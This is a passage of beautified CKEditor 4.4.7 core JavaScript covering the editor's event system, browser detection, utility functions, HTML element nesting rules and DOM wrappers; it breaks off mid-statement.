!function() {
    var e, n, i, t, s, o, a, r, T, C, c, l, d, u, h, f, m, g, E, p, I, O, D, R, v, b, K, y, _, k, N, S, w, x, A, L, B, P, F, $, M, q, H, z, j, U, V, W, G;
    window.CKEDITOR && window.CKEDITOR.dom || (window.CKEDITOR || (window.CKEDITOR = function() {
        var o = /(^|.*[\\\/])ckeditor\.js(?:\?.*|;.*)?$/i, t = {
            timestamp: "F0RD",
            version: "4.4.7",
            revision: "3a35b3d",
            rnd: Math.floor(900 * Math.random()) + 100,
            _: {
                pending: [],
                basePathSrcPattern: o
            },
            status: "unloaded",
            basePath: function() {
                var e = window.CKEDITOR_BASEPATH || "";
                if (!e) for (var t = document.getElementsByTagName("script"), n = 0; n < t.length; n++) {
                    var i = t[n].src.match(o);
                    if (i) {
                        e = i[1];
                        break;
                    }
                }
                if (-1 == e.indexOf(":/") && "//" != e.slice(0, 2) && (e = 0 === e.indexOf("/") ? location.href.match(/^.*?:\/\/[^\/]*/)[0] + e : location.href.match(/^[^\?]*\/(?:)/)[0] + e),
                !e) throw 'The CKEditor installation path could not be automatically detected. Please set the global variable "CKEDITOR_BASEPATH" before creating editor instances.';
                return e;
            }(),
            getUrl: function(e) {
                return -1 == e.indexOf(":/") && 0 !== e.indexOf("/") && (e = this.basePath + e),
                this.timestamp && "/" != e.charAt(e.length - 1) && !/[&?]t=/.test(e) && (e += (0 <= e.indexOf("?") ? "&" : "?") + "t=" + this.timestamp),
                e;
            },
            domReady: function() {
                function n() {
                    try {
                        document.addEventListener ? (document.removeEventListener("DOMContentLoaded", n, !1),
                        e()) : document.attachEvent && "complete" === document.readyState && (document.detachEvent("onreadystatechange", n),
                        e());
                    } catch (e) {}
                }
                function e() {
                    for (var e; e = t.shift(); ) e();
                }
                var t = [];
                return function(e) {
                    if (t.push(e), "complete" === document.readyState && setTimeout(n, 1), 1 == t.length) if (document.addEventListener) document.addEventListener("DOMContentLoaded", n, !1),
                    window.addEventListener("load", n, !1); else if (document.attachEvent) {
                        document.attachEvent("onreadystatechange", n), window.attachEvent("onload", n),
                        e = !1;
                        try {
                            e = !window.frameElement;
                        } catch (e) {}
                        document.documentElement.doScroll && e && function t() {
                            try {
                                document.documentElement.doScroll("left");
                            } catch (e) {
                                return void setTimeout(t, 1);
                            }
                            n();
                        }();
                    }
                };
            }()
        }, n = window.CKEDITOR_GETURL;
        if (n) {
            var i = t.getUrl;
            t.getUrl = function(e) {
                return n.call(t, e) || i.call(t, e);
            };
        }
        return t;
    }()), CKEDITOR.event || (CKEDITOR.event = function() {}, CKEDITOR.event.implementOn = function(e) {
        var t, n = CKEDITOR.event.prototype;
        for (t in n) null == e[t] && (e[t] = n[t]);
    }, CKEDITOR.event.prototype = function() {
        function d(e) {
            var t = f(this);
            return t[e] || (t[e] = new n(e));
        }
        var l, c, u, h, f = function(e) {
            return (e = e.getPrivate && e.getPrivate() || e._ || (e._ = {})).events || (e.events = {});
        }, n = function(e) {
            this.name = e, this.listeners = [];
        };
        return n.prototype = {
            getListenerIndex: function(e) {
                for (var t = 0, n = this.listeners; t < n.length; t++) if (n[t].fn == e) return t;
                return -1;
            }
        }, {
            define: function(e, t) {
                var n = d.call(this, e);
                CKEDITOR.tools.extend(n, t, !0);
            },
            on: function(o, a, r, s, e) {
                function t(e, t, n, i) {
                    return e = {
                        name: o,
                        sender: this,
                        editor: e,
                        data: t,
                        listenerData: s,
                        stop: n,
                        cancel: i,
                        removeListener: l
                    }, !1 !== a.call(r, e) && e.data;
                }
                function l() {
                    i.removeListener(o, a);
                }
                var n = d.call(this, o);
                if (n.getListenerIndex(a) < 0) {
                    n = n.listeners, r || (r = this), isNaN(e) && (e = 10);
                    var i = this;
                    t.fn = a, t.priority = e;
                    for (var c = n.length - 1; 0 <= c; c--) if (n[c].priority <= e) return n.splice(c + 1, 0, t),
                    {
                        removeListener: l
                    };
                    n.unshift(t);
                }
                return {
                    removeListener: l
                };
            },
            once: function() {
                var e = Array.prototype.slice.call(arguments), t = e[1];
                return e[1] = function(e) {
                    return e.removeListener(), t.apply(this, arguments);
                }, this.on.apply(this, e);
            },
            capture: function() {
                CKEDITOR.event.useCapture = 1;
                var e = this.on.apply(this, arguments);
                return CKEDITOR.event.useCapture = 0, e;
            },
            fire: (l = 0, c = function() {
                l = 1;
            }, u = 0, h = function() {
                u = 1;
            }, function(e, t, n) {
                var i = f(this)[e], o = (e = l, u);
                if (l = u = 0, i && (r = i.listeners).length) for (var a, r = r.slice(0), s = 0; s < r.length; s++) {
                    if (i.errorProof) try {
                        a = r[s].call(this, n, t, c, h);
                    } catch (e) {} else a = r[s].call(this, n, t, c, h);
                    if (!1 === a ? u = 1 : void 0 !== a && (t = a), l || u) break;
                }
                return t = !u && (void 0 === t || t), l = e, u = o, t;
            }),
            fireOnce: function(e, t, n) {
                return t = this.fire(e, t, n), delete f(this)[e], t;
            },
            removeListener: function(e, t) {
                var n = f(this)[e];
                if (n) {
                    var i = n.getListenerIndex(t);
                    0 <= i && n.listeners.splice(i, 1);
                }
            },
            removeAllListeners: function() {
                var e, t = f(this);
                for (e in t) delete t[e];
            },
            hasListeners: function(e) {
                return (e = f(this)[e]) && 0 < e.listeners.length;
            }
        };
    }()), CKEDITOR.editor || (CKEDITOR.editor = function() {
        CKEDITOR._.pending.push([ this, arguments ]), CKEDITOR.event.call(this);
    }, CKEDITOR.editor.prototype.fire = function(e, t) {
        return e in {
            instanceReady: 1,
            loaded: 1
        } && (this[e] = !0), CKEDITOR.event.prototype.fire.call(this, e, t, this);
    }, CKEDITOR.editor.prototype.fireOnce = function(e, t) {
        return e in {
            instanceReady: 1,
            loaded: 1
        } && (this[e] = !0), CKEDITOR.event.prototype.fireOnce.call(this, e, t, this);
    }, CKEDITOR.event.implementOn(CKEDITOR.editor.prototype)), CKEDITOR.env || (CKEDITOR.env = function() {
        var e = navigator.userAgent.toLowerCase(), t = {
            ie: -1 < e.indexOf("trident/"),
            webkit: -1 < e.indexOf(" applewebkit/"),
            air: -1 < e.indexOf(" adobeair/"),
            mac: -1 < e.indexOf("macintosh"),
            quirks: "BackCompat" == document.compatMode && (!document.documentMode || document.documentMode < 10),
            mobile: -1 < e.indexOf("mobile"),
            iOS: /(ipad|iphone|ipod)/.test(e),
            isCustomDomain: function() {
                if (!this.ie) return !1;
                var e = document.domain, t = window.location.hostname;
                return e != t && e != "[" + t + "]";
            },
            secure: "https:" == location.protocol
        };
        t.gecko = "Gecko" == navigator.product && !t.webkit && !t.ie, t.webkit && (-1 < e.indexOf("chrome") ? t.chrome = !0 : t.safari = !0);
        var n = 0;
        if (t.ie && (n = t.quirks || !document.documentMode ? parseFloat(e.match(/msie (\d+)/)[1]) : document.documentMode,
        t.ie9Compat = 9 == n, t.ie8Compat = 8 == n, t.ie7Compat = 7 == n, t.ie6Compat = n < 7 || t.quirks),
        t.gecko) {
            var i = e.match(/rv:([\d\.]+)/);
            i && (n = 1e4 * (i = i[1].split("."))[0] + 100 * (i[1] || 0) + 1 * (i[2] || 0));
        }
        return t.air && (n = parseFloat(e.match(/ adobeair\/(\d+)/)[1])), t.webkit && (n = parseFloat(e.match(/ applewebkit\/(\d+)/)[1])),
        t.version = n, t.isCompatible = t.iOS && 534 <= n || !t.mobile && (t.ie && 6 < n || t.gecko && 2e4 <= n || t.air && 1 <= n || t.webkit && 522 <= n || !1),
        t.hidpi = 2 <= window.devicePixelRatio, t.needsBrFiller = t.gecko || t.webkit || t.ie && 10 < n,
        t.needsNbspFiller = t.ie && n < 11, t.cssClass = "cke_browser_" + (t.ie ? "ie" : t.gecko ? "gecko" : t.webkit ? "webkit" : "unknown"),
        t.quirks && (t.cssClass = t.cssClass + " cke_browser_quirks"), t.ie && (t.cssClass = t.cssClass + " cke_browser_ie" + (t.quirks ? "6 cke_browser_iequirks" : t.version)),
        t.air && (t.cssClass = t.cssClass + " cke_browser_air"), t.iOS && (t.cssClass = t.cssClass + " cke_browser_ios"),
        t.hidpi && (t.cssClass = t.cssClass + " cke_hidpi"), t;
    }()), "unloaded" == CKEDITOR.status && (CKEDITOR.event.implementOn(CKEDITOR), CKEDITOR.loadFullCore = function() {
        if ("basic_ready" != CKEDITOR.status) CKEDITOR.loadFullCore._load = 1; else {
            delete CKEDITOR.loadFullCore;
            var e = document.createElement("script");
            e.type = "text/javascript", e.src = CKEDITOR.basePath + "ckeditor.js", document.getElementsByTagName("head")[0].appendChild(e);
        }
    }, CKEDITOR.loadFullCoreTimeout = 0, CKEDITOR.add = function(e) {
        (this._.pending || (this._.pending = [])).push(e);
    }, CKEDITOR.domReady(function() {
        var e = CKEDITOR.loadFullCore, t = CKEDITOR.loadFullCoreTimeout;
        e && (CKEDITOR.status = "basic_ready", e && e._load ? e() : t && setTimeout(function() {
            CKEDITOR.loadFullCore && CKEDITOR.loadFullCore();
        }, 1e3 * t));
    }), CKEDITOR.status = "basic_loaded"), CKEDITOR.dom = {}, U = [], V = CKEDITOR.env.gecko ? "-moz-" : CKEDITOR.env.webkit ? "-webkit-" : CKEDITOR.env.ie ? "-ms-" : "",
    W = /&gt;/g, G = /&lt;/g, CKEDITOR.on("reset", function() {
        U = [];
    }), CKEDITOR.tools = {
        arrayCompare: function(e, t) {
            if (!e && !t) return !0;
            if (!e || !t || e.length != t.length) return !1;
            for (var n = 0; n < e.length; n++) if (e[n] != t[n]) return !1;
            return !0;
        },
        clone: function(e) {
            var t;
            if (e && e instanceof Array) {
                t = [];
                for (var n = 0; n < e.length; n++) t[n] = CKEDITOR.tools.clone(e[n]);
                return t;
            }
            if (null === e || "object" != typeof e || e instanceof String || e instanceof Number || e instanceof Boolean || e instanceof Date || e instanceof RegExp || e.nodeType || e.window === e) return e;
            for (n in t = new e.constructor(), e) t[n] = CKEDITOR.tools.clone(e[n]);
            return t;
        },
        capitalize: function(e, t) {
            return e.charAt(0).toUpperCase() + (t ? e.slice(1) : e.slice(1).toLowerCase());
        },
        extend: function(e) {
            var t, n, i = arguments.length;
            "boolean" == typeof (t = arguments[i - 1]) ? i-- : "boolean" == typeof (t = arguments[i - 2]) && (n = arguments[i - 1],
            i -= 2);
            for (var o = 1; o < i; o++) {
                var a, r = arguments[o];
                for (a in r) !0 !== t && null != e[a] || (!n || a in n) && (e[a] = r[a]);
            }
            return e;
        },
        prototypedCopy: function(e) {
            var t = function() {};
            return t.prototype = e, new t();
        },
        copy: function(e) {
            var t, n = {};
            for (t in e) n[t] = e[t];
            return n;
        },
        isArray: function(e) {
            return "[object Array]" == Object.prototype.toString.call(e);
        },
        isEmpty: function(e) {
            for (var t in e) if (e.hasOwnProperty(t)) return !1;
            return !0;
        },
        cssVendorPrefix: function(e, t, n) {
            return n ? V + e + ":" + t + ";" + e + ":" + t : ((n = {})[e] = t, n[V + e] = t,
            n);
        },
        cssStyleToDomStyle: (z = document.createElement("div").style, j = void 0 !== z.cssFloat ? "cssFloat" : void 0 !== z.styleFloat ? "styleFloat" : "float",
        function(e) {
            return "float" == e ? j : e.replace(/-./g, function(e) {
                return e.substr(1).toUpperCase();
            });
        }),
        buildStyleHtml: function(e) {
            e = [].concat(e);
            for (var t, n = [], i = 0; i < e.length; i++) (t = e[i]) && (/@import|[{}]/.test(t) ? n.push("<style>" + t + "</style>") : n.push('<link type="text/css" rel=stylesheet href="' + t + '">'));
            return n.join("");
        },
        htmlEncode: function(e) {
            return ("" + e).replace(/&/g, "&amp;").replace(/>/g, "&gt;").replace(/</g, "&lt;");
        },
        htmlDecode: function(e) {
            return e.replace(/&amp;/g, "&").replace(W, ">").replace(G, "<");
        },
        htmlEncodeAttr: function(e) {
            return e.replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        },
        htmlDecodeAttr: function(e) {
            return e.replace(/&quot;/g, '"').replace(G, "<").replace(W, ">");
        },
        getNextNumber: (H = 0, function() {
            return ++H;
        }),
        getNextId: function() {
            return "cke_" + this.getNextNumber();
        },
        override: function(e, t) {
            var n = t(e);
            return n.prototype = e.prototype, n;
        },
        setTimeout: function(e, t, n, i, o) {
            return o || (o = window), n || (n = o), o.setTimeout(function() {
                i ? e.apply(n, [].concat(i)) : e.apply(n);
            }, t || 0);
        },
        trim: function(e) {
            return e.replace(/(?:^[ \t\n\r]+)|(?:[ \t\n\r]+$)/g, "");
        },
        ltrim: function(e) {
            return e.replace(/^[ \t\n\r]+/g, "");
        },
        rtrim: function(e) {
            return e.replace(/[ \t\n\r]+$/g, "");
        },
        indexOf: function(e, t) {
            if ("function" == typeof t) {
                for (var n = 0, i = e.length; n < i; n++) if (t(e[n])) return n;
            } else {
                if (e.indexOf) return e.indexOf(t);
                for (n = 0, i = e.length; n < i; n++) if (e[n] === t) return n;
            }
            return -1;
        },
        search: function(e, t) {
            var n = CKEDITOR.tools.indexOf(e, t);
            return 0 <= n ? e[n] : null;
        },
        bind: function(e, t) {
            return function() {
                return e.apply(t, arguments);
            };
        },
        createClass: function(e) {
            var t = e.$, n = e.base, i = e.privates || e._, o = e.proto;
            if (e = e.statics, !t && (t = function() {
                n && this.base.apply(this, arguments);
            }), i) {
                var a = t;
                t = function() {
                    var e, t = this._ || (this._ = {});
                    for (e in i) {
                        var n = i[e];
                        t[e] = "function" == typeof n ? CKEDITOR.tools.bind(n, this) : n;
                    }
                    a.apply(this, arguments);
                };
            }
            return n && (t.prototype = this.prototypedCopy(n.prototype), (t.prototype.constructor = t).base = n,
            t.baseProto = n.prototype, t.prototype.base = function() {
                this.base = n.prototype.base, n.apply(this, arguments), this.base = arguments.callee;
            }), o && this.extend(t.prototype, o, !0), e && this.extend(t, e, !0), t;
        },
        addFunction: function(e, t) {
            return U.push(function() {
                return e.apply(t || this, arguments);
            }) - 1;
        },
        removeFunction: function(e) {
            U[e] = null;
        },
        callFunction: function(e) {
            var t = U[e];
            return t && t.apply(window, Array.prototype.slice.call(arguments, 1));
        },
        cssLength: (q = /^-?\d+\.?\d*px$/, function(e) {
            return M = CKEDITOR.tools.trim(e + "") + "px", q.test(M) ? M : e || "";
        }),
        convertToPx: function(e) {
            return $ || ($ = CKEDITOR.dom.element.createFromHtml('<div style="position:absolute;left:-9999px;top:-9999px;margin:0px;padding:0px;border:0px;"></div>', CKEDITOR.document),
            CKEDITOR.document.getBody().append($)), /%$/.test(e) ? e : ($.setStyle("width", e),
            $.$.clientWidth);
        },
        repeat: function(e, t) {
            return Array(t + 1).join(e);
        },
        tryThese: function() {
            for (var e, t = 0, n = arguments.length; t < n; t++) {
                var i = arguments[t];
                try {
                    e = i();
                    break;
                } catch (e) {}
            }
            return e;
        },
        genKey: function() {
            return Array.prototype.slice.call(arguments).join("-");
        },
        defer: function(n) {
            return function() {
                var e = arguments, t = this;
                window.setTimeout(function() {
                    n.apply(t, e);
                }, 0);
            };
        },
        normalizeCssText: function(e, t) {
            var n, i = [], o = CKEDITOR.tools.parseCssText(e, !0, t);
            for (n in o) i.push(n + ":" + o[n]);
            return i.sort(), i.length ? i.join(";") + ";" : "";
        },
        convertRgbToHex: function(e) {
            return e.replace(/(?:rgb\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\))/gi, function(e, t, n, i) {
                for (e = [ t, n, i ], t = 0; t < 3; t++) e[t] = ("0" + parseInt(e[t], 10).toString(16)).slice(-2);
                return "#" + e.join("");
            });
        },
        parseCssText: function(e, i, t) {
            var o = {};
            return t && ((t = new CKEDITOR.dom.element("span")).setAttribute("style", e), e = CKEDITOR.tools.convertRgbToHex(t.getAttribute("style") || "")),
            e && ";" != e && e.replace(/&quot;/g, '"').replace(/\s*([^:;\s]+)\s*:\s*([^;]+)\s*(?=;|$)/g, function(e, t, n) {
                i && ("font-family" == (t = t.toLowerCase()) && (n = n.toLowerCase().replace(/["']/g, "").replace(/\s*,\s*/g, ",")),
                n = CKEDITOR.tools.trim(n)), o[t] = n;
            }), o;
        },
        writeCssText: function(e, t) {
            var n, i = [];
            for (n in e) i.push(n + ":" + e[n]);
            return t && i.sort(), i.join("; ");
        },
        objectCompare: function(e, t, n) {
            var i;
            if (!e && !t) return !0;
            if (!e || !t) return !1;
            for (i in e) if (e[i] != t[i]) return !1;
            if (!n) for (i in t) if (e[i] != t[i]) return !1;
            return !0;
        },
        objectKeys: function(e) {
            var t, n = [];
            for (t in e) n.push(t);
            return n;
        },
        convertArrayToObject: function(e, t) {
            var n = {};
            1 == arguments.length && (t = !0);
            for (var i = 0, o = e.length; i < o; ++i) n[e[i]] = t;
            return n;
        },
        fixDomain: function() {
            for (var t; ;) try {
                t = window.parent.document.domain;
                break;
            } catch (e) {
                if (!(t = t ? t.replace(/.+?(?:\.|$)/, "") : document.domain)) break;
                document.domain = t;
            }
            return !!t;
        },
        eventsBuffer: function(t, e) {
            function n() {
                o = new Date().getTime(), i = !1, e();
            }
            var i, o = 0;
            return {
                input: function() {
                    if (!i) {
                        var e = new Date().getTime() - o;
                        e < t ? i = setTimeout(n, t - e) : n();
                    }
                },
                reset: function() {
                    i && clearTimeout(i), i = o = 0;
                }
            };
        },
        enableHtml5Elements: function(e, t) {
            for (var n, i = [ "abbr", "article", "aside", "audio", "bdi", "canvas", "data", "datalist", "details", "figcaption", "figure", "footer", "header", "hgroup", "mark", "meter", "nav", "output", "progress", "section", "summary", "time", "video" ], o = i.length; o--; ) n = e.createElement(i[o]),
            t && e.appendChild(n);
        },
        checkIfAnyArrayItemMatches: function(e, t) {
            for (var n = 0, i = e.length; n < i; ++n) if (e[n].match(t)) return !0;
            return !1;
        },
        checkIfAnyObjectPropertyMatches: function(e, t) {
            for (var n in e) if (n.match(t)) return !0;
            return !1;
        },
        transparentImageData: "data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
    }, CKEDITOR.dtd = (S = function(e, t) {
        for (var n = CKEDITOR.tools.clone(e), i = 1; i < arguments.length; i++) {
            var o;
            for (o in arguments[i]) delete n[o];
        }
        return n;
    }, x = {}, A = {
        address: 1,
        article: 1,
        aside: 1,
        blockquote: 1,
        details: 1,
        div: 1,
        dl: 1,
        fieldset: 1,
        figure: 1,
        footer: 1,
        form: 1,
        h1: 1,
        h2: 1,
        h3: 1,
        h4: 1,
        h5: 1,
        h6: 1,
        header: 1,
        hgroup: 1,
        hr: 1,
        main: 1,
        menu: 1,
        nav: 1,
        ol: 1,
        p: 1,
        pre: 1,
        section: 1,
        table: 1,
        ul: 1
    }, L = {
        command: 1,
        link: 1,
        meta: 1,
        noscript: 1,
        script: 1,
        style: 1
    }, B = {}, F = {
        center: 1,
        dir: 1,
        noframes: 1
    }, (N = CKEDITOR.tools.extend)(w = {}, {
        a: 1,
        abbr: 1,
        area: 1,
        audio: 1,
        b: 1,
        bdi: 1,
        bdo: 1,
        br: 1,
        button: 1,
        canvas: 1,
        cite: 1,
        code: 1,
        command: 1,
        datalist: 1,
        del: 1,
        dfn: 1,
        em: 1,
        embed: 1,
        i: 1,
        iframe: 1,
        img: 1,
        input: 1,
        ins: 1,
        kbd: 1,
        keygen: 1,
        label: 1,
        map: 1,
        mark: 1,
        meter: 1,
        noscript: 1,
        object: 1,
        output: 1,
        progress: 1,
        q: 1,
        ruby: 1,
        s: 1,
        samp: 1,
        script: 1,
        select: 1,
        small: 1,
        span: 1,
        strong: 1,
        sub: 1,
        sup: 1,
        textarea: 1,
        time: 1,
        u: 1,
        var: 1,
        video: 1,
        wbr: 1
    }, P = {
        "#": 1
    }, {
        acronym: 1,
        applet: 1,
        basefont: 1,
        big: 1,
        font: 1,
        isindex: 1,
        strike: 1,
        style: 1,
        tt: 1
    }), N(x, A, w, F), N(S = {
        a: S(w, {
            a: 1,
            button: 1
        }),
        abbr: w,
        address: x,
        area: B,
        article: x,
        aside: x,
        audio: N({
            source: 1,
            track: 1
        }, x),
        b: w,
        base: B,
        bdi: w,
        bdo: w,
        blockquote: x,
        body: x,
        br: B,
        button: S(w, {
            a: 1,
            button: 1
        }),
        canvas: w,
        caption: x,
        cite: w,
        code: w,
        col: B,
        colgroup: {
            col: 1
        },
        command: B,
        datalist: N({
            option: 1
        }, w),
        dd: x,
        del: w,
        details: N({
            summary: 1
        }, x),
        dfn: w,
        div: x,
        dl: {
            dt: 1,
            dd: 1
        },
        dt: x,
        em: w,
        embed: B,
        fieldset: N({
            legend: 1
        }, x),
        figcaption: x,
        figure: N({
            figcaption: 1
        }, x),
        footer: x,
        form: x,
        h1: w,
        h2: w,
        h3: w,
        h4: w,
        h5: w,
        h6: w,
        head: N({
            title: 1,
            base: 1
        }, L),
        header: x,
        hgroup: {
            h1: 1,
            h2: 1,
            h3: 1,
            h4: 1,
            h5: 1,
            h6: 1
        },
        hr: B,
        html: N({
            head: 1,
            body: 1
        }, x, L),
        i: w,
        iframe: P,
        img: B,
        input: B,
        ins: w,
        kbd: w,
        keygen: B,
        label: w,
        legend: w,
        li: x,
        link: B,
        main: x,
        map: x,
        mark: w,
        menu: N({
            li: 1
        }, x),
        meta: B,
        meter: S(w, {
            meter: 1
        }),
        nav: x,
        noscript: N({
            link: 1,
            meta: 1,
            style: 1
        }, w),
        object: N({
            param: 1
        }, w),
        ol: {
            li: 1
        },
        optgroup: {
            option: 1
        },
        option: P,
        output: w,
        p: w,
        param: B,
        pre: w,
        progress: S(w, {
            progress: 1
        }),
        q: w,
        rp: w,
        rt: w,
        ruby: N({
            rp: 1,
            rt: 1
        }, w),
        s: w,
        samp: w,
        script: P,
        section: x,
        select: {
            optgroup: 1,
            option: 1
        },
        small: w,
        source: B,
        span: w,
        strong: w,
        style: P,
        sub: w,
        summary: w,
        sup: w,
        table: {
            caption: 1,
            colgroup: 1,
            thead: 1,
            tfoot: 1,
            tbody: 1,
            tr: 1
        },
        tbody: {
            tr: 1
        },
        td: x,
        textarea: P,
        tfoot: {
            tr: 1
        },
        th: x,
        thead: {
            tr: 1
        },
        time: S(w, {
            time: 1
        }),
        title: P,
        tr: {
            th: 1,
            td: 1
        },
        track: B,
        u: w,
        ul: {
            li: 1
        },
        var: w,
        video: N({
            source: 1,
            track: 1
        }, x),
        wbr: B,
        acronym: w,
        applet: N({
            param: 1
        }, x),
        basefont: B,
        big: w,
        center: x,
        dialog: B,
        dir: {
            li: 1
        },
        font: w,
        isindex: B,
        noframes: x,
        strike: w,
        tt: w
    }, {
        $block: N({
            audio: 1,
            dd: 1,
            dt: 1,
            figcaption: 1,
            li: 1,
            video: 1
        }, A, F),
        $blockLimit: {
            article: 1,
            aside: 1,
            audio: 1,
            body: 1,
            caption: 1,
            details: 1,
            dir: 1,
            div: 1,
            dl: 1,
            fieldset: 1,
            figcaption: 1,
            figure: 1,
            footer: 1,
            form: 1,
            header: 1,
            hgroup: 1,
            main: 1,
            menu: 1,
            nav: 1,
            ol: 1,
            section: 1,
            table: 1,
            td: 1,
            th: 1,
            tr: 1,
            ul: 1,
            video: 1
        },
        $cdata: {
            script: 1,
            style: 1
        },
        $editable: {
            address: 1,
            article: 1,
            aside: 1,
            blockquote: 1,
            body: 1,
            details: 1,
            div: 1,
            fieldset: 1,
            figcaption: 1,
            footer: 1,
            form: 1,
            h1: 1,
            h2: 1,
            h3: 1,
            h4: 1,
            h5: 1,
            h6: 1,
            header: 1,
            hgroup: 1,
            main: 1,
            nav: 1,
            p: 1,
            pre: 1,
            section: 1
        },
        $empty: {
            area: 1,
            base: 1,
            basefont: 1,
            br: 1,
            col: 1,
            command: 1,
            dialog: 1,
            embed: 1,
            hr: 1,
            img: 1,
            input: 1,
            isindex: 1,
            keygen: 1,
            link: 1,
            meta: 1,
            param: 1,
            source: 1,
            track: 1,
            wbr: 1
        },
        $inline: w,
        $list: {
            dl: 1,
            ol: 1,
            ul: 1
        },
        $listItem: {
            dd: 1,
            dt: 1,
            li: 1
        },
        $nonBodyContent: N({
            body: 1,
            head: 1,
            html: 1
        }, S.head),
        $nonEditable: {
            applet: 1,
            audio: 1,
            button: 1,
            embed: 1,
            iframe: 1,
            map: 1,
            object: 1,
            option: 1,
            param: 1,
            script: 1,
            textarea: 1,
            video: 1
        },
        $object: {
            applet: 1,
            audio: 1,
            button: 1,
            hr: 1,
            iframe: 1,
            img: 1,
            input: 1,
            object: 1,
            select: 1,
            table: 1,
            textarea: 1,
            video: 1
        },
        $removeEmpty: {
            abbr: 1,
            acronym: 1,
            b: 1,
            bdi: 1,
            bdo: 1,
            big: 1,
            cite: 1,
            code: 1,
            del: 1,
            dfn: 1,
            em: 1,
            font: 1,
            i: 1,
            ins: 1,
            label: 1,
            kbd: 1,
            mark: 1,
            meter: 1,
            output: 1,
            q: 1,
            ruby: 1,
            s: 1,
            samp: 1,
            small: 1,
            span: 1,
            strike: 1,
            strong: 1,
            sub: 1,
            sup: 1,
            time: 1,
            tt: 1,
            u: 1,
            var: 1
        },
        $tabIndex: {
            a: 1,
            area: 1,
            button: 1,
            input: 1,
            object: 1,
            select: 1,
            textarea: 1
        },
        $tableContent: {
            caption: 1,
            col: 1,
            colgroup: 1,
            tbody: 1,
            td: 1,
            tfoot: 1,
            th: 1,
            thead: 1,
            tr: 1
        },
        $transparent: {
            a: 1,
            audio: 1,
            canvas: 1,
            del: 1,
            ins: 1,
            map: 1,
            noscript: 1,
            object: 1,
            video: 1
        },
        $intermediate: {
            caption: 1,
            colgroup: 1,
            dd: 1,
            dt: 1,
            figcaption: 1,
            legend: 1,
            li: 1,
            optgroup: 1,
            option: 1,
            rp: 1,
            rt: 1,
            summary: 1,
            tbody: 1,
            td: 1,
            tfoot: 1,
            th: 1,
            thead: 1,
            tr: 1
        }
    }), S), CKEDITOR.dom.event = function(e) {
        this.$ = e;
    }, CKEDITOR.dom.event.prototype = {
        getKey: function() {
            return this.$.keyCode || this.$.which;
        },
        getKeystroke: function() {
            var e = this.getKey();
            return (this.$.ctrlKey || this.$.metaKey) && (e += CKEDITOR.CTRL), this.$.shiftKey && (e += CKEDITOR.SHIFT),
            this.$.altKey && (e += CKEDITOR.ALT), e;
        },
        preventDefault: function(e) {
            var t = this.$;
            t.preventDefault ? t.preventDefault() : t.returnValue = !1, e && this.stopPropagation();
        },
        stopPropagation: function() {
            var e = this.$;
            e.stopPropagation ? e.stopPropagation() : e.cancelBubble = !0;
        },
        getTarget: function() {
            var e = this.$.target || this.$.srcElement;
            return e ? new CKEDITOR.dom.node(e) : null;
        },
        getPhase: function() {
            return this.$.eventPhase || 2;
        },
        getPageOffset: function() {
            var e = this.getTarget().getDocument().$;
            return {
                x: this.$.pageX || this.$.clientX + (e.documentElement.scrollLeft || e.body.scrollLeft),
                y: this.$.pageY || this.$.clientY + (e.documentElement.scrollTop || e.body.scrollTop)
            };
        }
    }, CKEDITOR.CTRL = 1114112, CKEDITOR.SHIFT = 2228224, CKEDITOR.ALT = 4456448, CKEDITOR.EVENT_PHASE_CAPTURING = 1,
    CKEDITOR.EVENT_PHASE_AT_TARGET = 2, CKEDITOR.EVENT_PHASE_BUBBLING = 3, CKEDITOR.dom.domObject = function(e) {
        e && (this.$ = e);
    }, CKEDITOR.dom.domObject.prototype = {
        getPrivate: function() {
            var e;
            return (e = this.getCustomData("_")) || this.setCustomData("_", e = {}), e;
        },
        on: function(e) {
            var t, n, i = this.getCustomData("_cke_nativeListeners");
            return i || (i = {}, this.setCustomData("_cke_nativeListeners", i)), i[e] || (i = i[e] = (t = this,
            n = e, function(e) {
                "undefined" != typeof CKEDITOR && t.fire(n, new CKEDITOR.dom.event(e));
            }), this.$.addEventListener ? this.$.addEventListener(e, i, !!CKEDITOR.event.useCapture) : this.$.attachEvent && this.$.attachEvent("on" + e, i)),
            CKEDITOR.event.prototype.on.apply(this, arguments);
        },
        removeListener: function(e) {
            if (CKEDITOR.event.prototype.removeListener.apply(this, arguments), !this.hasListeners(e)) {
                var t = this.getCustomData("_cke_nativeListeners"), n = t && t[e];
                n && (this.$.removeEventListener ? this.$.removeEventListener(e, n, !1) : this.$.detachEvent && this.$.detachEvent("on" + e, n),
                delete t[e]);
            }
        },
        removeAllListeners: function() {
            var e, t = this.getCustomData("_cke_nativeListeners");
            for (e in t) {
                var n = t[e];
                this.$.detachEvent ? this.$.detachEvent("on" + e, n) : this.$.removeEventListener && this.$.removeEventListener(e, n, !1),
                delete t[e];
            }
            CKEDITOR.event.prototype.removeAllListeners.call(this);
        }
    }, _ = CKEDITOR.dom.domObject.prototype, k = {}, CKEDITOR.on("reset", function() {
        k = {};
    }), _.equals = function(e) {
        try {
            return e && e.$ === this.$;
        } catch (e) {
            return !1;
        }
    }, _.setCustomData = function(e, t) {
        var n = this.getUniqueId();
        return (k[n] || (k[n] = {}))[e] = t, this;
    }, _.getCustomData = function(e) {
        var t = this.$["data-cke-expando"];
        return (t = t && k[t]) && e in t ? t[e] : null;
    }, _.removeCustomData = function(e) {
        var t, n, i = this.$["data-cke-expando"];
        return (i = i && k[i]) && (t = i[e], n = e in i, delete i[e]), n ? t : null;
    }, _.clearCustomData = function() {
        this.removeAllListeners();
        var e = this.$["data-cke-expando"];
        e && delete k[e];
    }, _.getUniqueId = function() {
        return this.$["data-cke-expando"] || (this.$["data-cke-expando"] = CKEDITOR.tools.getNextNumber());
    }, CKEDITOR.event.implementOn(_), CKEDITOR.dom.node = function(e) {
        return e ? new CKEDITOR.dom[e.nodeType == CKEDITOR.NODE_DOCUMENT ? "document" : e.nodeType == CKEDITOR.NODE_ELEMENT ? "element" : e.nodeType == CKEDITOR.NODE_TEXT ? "text" : e.nodeType == CKEDITOR.NODE_COMMENT ? "comment" : e.nodeType == CKEDITOR.NODE_DOCUMENT_FRAGMENT ? "documentFragment" : "domObject"](e) : this;
    }, CKEDITOR.dom.node.prototype = new CKEDITOR.dom.domObject(), CKEDITOR.NODE_ELEMENT = 1,
